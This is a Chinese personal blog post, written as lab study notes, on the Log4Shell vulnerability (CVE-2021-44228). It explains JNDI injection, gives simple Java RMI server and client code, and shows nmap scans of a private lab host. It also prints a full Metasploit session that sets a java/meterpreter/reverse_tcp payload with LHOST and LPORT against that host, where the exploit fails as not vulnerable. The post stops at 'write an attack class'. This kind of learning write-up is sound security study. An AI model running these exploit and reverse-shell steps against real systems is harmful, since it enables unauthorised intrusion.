<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="tea9">


    <meta name="subtitle" content="加油">


    <meta name="description" content="心中有光の孩子 提示：图片都存到了github仓库需要挂代理才能看到">


    <meta name="keywords" content="tea9,tea9的博客,开发,android,安全,android安全,android逆向,移动安全,frida,xposed,ollvm,查查查,茶茶茶,茶茶,茶姐姐,茶姐姐博客,茶茶茶博客,茶茶blog">


<title>log4j2安全远程漏洞 | tea9のblog</title>



    <link rel="icon" href="/image/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 6.2.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">Tea9&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">Tea9&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // 为 6 时展开所有
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">log4j2安全远程漏洞</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">tea9</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">二月 26, 2023&nbsp;&nbsp;19:53:29</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/Security/">Security</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h2 id="前言】"><a href="#前言】" class="headerlink" title="前言】"></a>前言】</h2><p>因为之前面试中问道了，以为自己清除理解了log4j漏洞，没想到一问之后问蒙了，知识的输入往往一知半解，需要深入理解之后才能完全明白。</p>
<p>经典漏洞都是类似，都会反复提到，你不会的话就只能反复被鞭尸，跟群友也没办法辩驳</p>
<p>防止露怯，赶紧学一下</p>
<p>Log4j2安全远程漏洞，又称“Log4Shell”,漏洞编号CVE-2021-44228,总结来说就是一个非常简单的JNDI注入漏洞。说白了是log4j2的特性，Log4J在扩展占位符时在记录消息时候（或间接作为格式化消息的参数）执行JNDI lookup()操作。在默认配置中，JNDI支持两种协议：RMI和LDAP。在这两种情况下，lookup()的调用实际上是为了返回一个Java对象。这通常为序列化的Java对象，但是还有一个通过于间接构造的JNDI引用。这个对象和引用字节码可以通过远程URL加载代（java类.class）。</p>
<p>Apache Log4j2 是一款开源的 Java 日志记录工具，大量的业务框架都使用了该组件。此次漏洞是用于 Log4j2 提供的 lookup 功能造成的，该功能允许开发者通过一些协议去读取相应环境中的配置。但在实现的过程中，并未对输入进行严格的判断，从而造成漏洞的发生。</p>
<p>受影响版本</p>
<p><strong>2.x&lt;&#x3D;2.14.1</strong></p>
<h2 id="Log4j2"><a href="#Log4j2" class="headerlink" title="Log4j2"></a>Log4j2</h2><p>Log4j2是Apache的一个开源项目，通过使用Log4j2，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。最令人感兴趣的就是，这些可以通过一个配置文件来灵活地进行配置，而不需要修改应用的代码。</p>
<h2 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h2><p>JNDI，全称Java Naming and Directory Interface（Java命名和目录接口) 是Java中引入一种Java API，它允许客户端通过名称发现查找和共享Java数据和对象。这些对象可以存储在不同的命名或目录中，例如远程方法调用(RMI)、通用对象请求代理架构(CORBA)、轻量级目录访问协议(LDAP)或域名服务(DNS)等。</p>
<p>基于JNDI的这种特性，如果他接收的参数，来源于攻击者恶意构造的，则就会有远程代码记载和执行。</p>
<p>JNDI内置的目录服务：</p>
<p>RMI：Java Remote Method Invocation,Java远程方法调用</p>
<p>LDAP：轻量级目录访问协议</p>
<p>CORBA:Common Object Request Broker Architecture 通用对象请求代理架构，用于COS名称服务（Common Object Services）</p>
<p>DNS服务</p>
<h2 id="rmi"><a href="#rmi" class="headerlink" title="rmi"></a>rmi</h2><p>RMI协议全称为Remote Method Invocation （远程方法调用）协议</p>
<p>一个RMI由三部分组成：</p>
<p>RMI Registry</p>
<p>RMI Server</p>
<p>RMI Client</p>
<p>RMIServer （我的理解是这个是攻击的服务端，可以进行恶意执行在client端</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IRemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title class_">Remote</span>&#123;</span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">IRemoteHelloWorld</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">RemoteHelloWorld</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            <span class="built_in">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;call from&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">RemoteHelloWorld</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>();</span><br><span class="line">        <span class="comment">//创建Registry并绑定</span></span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>,h);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMIServer</span>().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>服务端启动后运行main方法，等待客户端连接</p>
<p>RMIClient(我的理解可以属于被害端，如果可以构造lookup执行的协议就可以任意执行了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">package rmi2;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import java.rmi.Naming;</span><br><span class="line"></span><br><span class="line">public class RMIClient &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        RMIServer.IRemoteHelloWorld hello = (RMIServer.IRemoteHelloWorld)</span><br><span class="line">                Naming.lookup(&quot;rmi://192.168.1.2:1099/Hello&quot;);</span><br><span class="line">        String ret = hello.hello();</span><br><span class="line">        System.out.println(ret);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ip是本地ipconfig查询ipv4地址</p>
<p>执行client main方法</p>
<p>执行结果(RMIClient</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\Hello World</span><br><span class="line"></span><br><span class="line">进程已结束,退出代码0</span><br></pre></td></tr></table></figure>

<p>执行结果（RMIServer</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call from</span><br></pre></td></tr></table></figure>



<p><strong>nmap检测rmi</strong>(kali</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.1.2</span><br><span class="line">└─# nmap 192.168.1.2</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2023-03-01 02:49 EST</span><br><span class="line">Nmap scan report for 192.168.1.2</span><br><span class="line">Host is up (0.00030s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">**1099/tcp open  rmiregistry**</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">MAC Address: 4C:79:6E:D7:37:AA (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 4.14 seconds</span><br></pre></td></tr></table></figure>

<p><strong>nmap检测脚本是否存在</strong>(kali</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">nmap –script=rmi-vuln-classloader -p 1099 192.168.1.2</span><br><span class="line"></span><br><span class="line">└─# nmap –script=rmi-vuln-classloader -p 1099 192.168.1.2              255 ⨯</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2023-03-01 02:46 EST</span><br><span class="line">Failed to resolve &quot;–script=rmi-vuln-classloader&quot;.</span><br><span class="line">Nmap scan report for 192.168.1.2</span><br><span class="line">Host is up (0.00024s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">**1099/tcp open  rmiregistry**</span><br><span class="line">MAC Address: 4C:79:6E:D7:37:AA (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.20 seconds</span><br></pre></td></tr></table></figure>

<p><strong>msf漏洞扫描</strong></p>
<p>kali</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">搜索java_rmi</span><br><span class="line">msf6 &gt; search java_rmi</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                            Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                            ---------------  ----       -----  -----------</span><br><span class="line">   0  auxiliary/gather/java_rmi_registry                               normal     No     Java RMI Registry Interfaces Enumeration</span><br><span class="line">   1  auxiliary/scanner/misc/java_rmi_server          2011-10-15       normal     No     Java RMI Server Insecure Endpoint Code Execution Scanner</span><br><span class="line">   2  exploit/multi/browser/java_rmi_connection_impl  2010-03-31       excellent  No     Java RMIConnectionImpl Deserialization Privilege Escalation      </span><br><span class="line">   3  exploit/multi/misc/java_rmi_server              2011-10-15       excellent  Yes    Java RMI Server Insecure Default Configuration Java Code Execution</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 3, use 3 or use exploit/multi/misc/java_rmi_server                                              </span><br><span class="line">使用扫描模块</span><br><span class="line">msf6 &gt; use auxiliary/scanner/misc/java_rmi_server</span><br><span class="line">显示选项</span><br><span class="line">msf6 auxiliary(scanner/misc/java_rmi_server) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/misc/java_rmi_server):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT    1099             yes       The target port (TCP)</span><br><span class="line">   THREADS  1                yes       The number of concurrent threads (max one per host)</span><br><span class="line"></span><br><span class="line">设置RHOSTS</span><br><span class="line">msf6 auxiliary(scanner/misc/java_rmi_server) &gt; set RHOSTS 192.168.1.2</span><br><span class="line">RHOSTS =&gt; 192.168.1.2</span><br><span class="line">设置端口</span><br><span class="line">msf6 auxiliary(scanner/misc/java_rmi_server) &gt; set RPORT 1099</span><br><span class="line">RPORT =&gt; 1099</span><br><span class="line">启动</span><br><span class="line">msf6 auxiliary(scanner/misc/java_rmi_server) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 192.168.1.2:1099      - 192.168.1.2:1099 Java RMI Endpoint Detected: Class Loader Disabled</span><br><span class="line">[*] 192.168.1.2:1099      - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">msf6 auxiliary(scanner/misc/java_rmi_server) &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>msf漏洞利用</strong></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/53596025">https://zhuanlan.zhihu.com/p/53596025</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line">漏洞利用模块</span><br><span class="line">msf6 exploit(multi/misc/java_rmi_server) &gt; use exploit/multi/misc/java_rmi_server</span><br><span class="line">[*] Using configured payload java/meterpreter/reverse_tcp</span><br><span class="line">查看选项</span><br><span class="line">msf6 exploit(multi/misc/java_rmi_server) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/misc/java_rmi_server):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   HTTPDELAY  10               yes       Time that the HTTP Server will wait for the payload request</span><br><span class="line">   RHOSTS     192.168.1.173    yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT      4444             yes       The target port (TCP)</span><br><span class="line">   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.</span><br><span class="line">   SRVPORT    8080             yes       The local port to listen on.</span><br><span class="line">   SSL        false            no        Negotiate SSL for incoming connections</span><br><span class="line">   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)</span><br><span class="line">   URIPATH                     no        The URI to use for this exploit (default is random)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (java/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.1.173    yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Generic (Java Payload)</span><br><span class="line"></span><br><span class="line">设置RHOSTS和RPORT</span><br><span class="line">msf6 exploit(multi/misc/java_rmi_server) &gt; set RHOSTS 192.168.1.2</span><br><span class="line">RHOSTS =&gt; 192.168.1.2</span><br><span class="line">msf6 exploit(multi/misc/java_rmi_server) &gt; set RPORT 1099</span><br><span class="line">RPORT =&gt; 1099</span><br><span class="line">设置payload进行反向TCP shell连接</span><br><span class="line">msf6 exploit(multi/misc/java_rmi_server) &gt; set payload /java/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; java/meterpreter/reverse_tcp</span><br><span class="line">显示选项</span><br><span class="line">msf6 exploit(multi/misc/java_rmi_server) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/misc/java_rmi_server):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   HTTPDELAY  10               yes       Time that the HTTP Server will wait for the payload request</span><br><span class="line">   RHOSTS     192.168.1.2      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT      1099             yes       The target port (TCP)</span><br><span class="line">   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.</span><br><span class="line">   SRVPORT    8080             yes       The local port to listen on.</span><br><span class="line">   SSL        false            no        Negotiate SSL for incoming connections</span><br><span class="line">   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)</span><br><span class="line">   URIPATH                     no        The URI to use for this exploit (default is random)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (java/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.1.173    yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Generic (Java Payload)</span><br><span class="line"></span><br><span class="line">设置LHOSTS LPORT</span><br><span class="line">msf6 exploit(multi/misc/java_rmi_server) &gt; set LHOSTS 192.168.1.173</span><br><span class="line">LHOSTS =&gt; 192.168.1.173</span><br><span class="line">msf6 exploit(multi/misc/java_rmi_server) &gt; set LPORT 4444</span><br><span class="line">LPORT =&gt; 4444</span><br><span class="line">启动</span><br><span class="line">msf6 exploit(multi/misc/java_rmi_server) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.173:4444 </span><br><span class="line">[*] 192.168.1.2:1099 - Using URL: http://0.0.0.0:8080/4OnBVPSoz5Gaa</span><br><span class="line">[*] 192.168.1.2:1099 - Local IP: http://192.168.1.173:8080/4OnBVPSoz5Gaa</span><br><span class="line">[*] 192.168.1.2:1099 - Server started.</span><br><span class="line">[*] 192.168.1.2:1099 - Sending RMI Header...</span><br><span class="line">[*] 192.168.1.2:1099 - Sending RMI Call...</span><br><span class="line">[-] 192.168.1.2:1099 - Exploit failed [not-vulnerable]: RuntimeError Exploit aborted due to failure not-vulnerable The RMI class loader is disabled</span><br><span class="line">[*] 192.168.1.2:1099 - Server stopped.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line">msf6 exploit(multi/misc/java_rmi_server) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/misc/java_rmi_server):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   HTTPDELAY  10               yes       Time that the HTTP Server will wait for the payload request</span><br><span class="line">   RHOSTS     192.168.1.2      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT      1099             yes       The target port (TCP)</span><br><span class="line">   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.</span><br><span class="line">   SRVPORT    8080             yes       The local port to listen on.</span><br><span class="line">   SSL        false            no        Negotiate SSL for incoming connections</span><br><span class="line">   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)</span><br><span class="line">   URIPATH                     no        The URI to use for this exploit (default is random)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (java/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.1.173    yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Generic (Java Payload)</span><br><span class="line"></span><br><span class="line">查看会话 我的这里不知道为什么连接不上</span><br><span class="line">msf6 exploit(multi/misc/java_rmi_server) &gt; session -i</span><br><span class="line">[-] Unknown command: session.</span><br><span class="line">建立会话连接之后，我们就可以使用sysinfo，shell和getuid等命令了，如图：</span><br><span class="line">sessions -i 1</span><br><span class="line">sysinfo</span><br></pre></td></tr></table></figure>



<h2 id="Log4j2-复现"><a href="#Log4j2-复现" class="headerlink" title="Log4j2 复现"></a>Log4j2 复现</h2><p><a target="_blank" rel="noopener" href="https://baijiahao.baidu.com/s?id=1719588505580618757&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1719588505580618757&amp;wfr=spider&amp;for=pc</a></p>
<p>写一个攻击类</p>
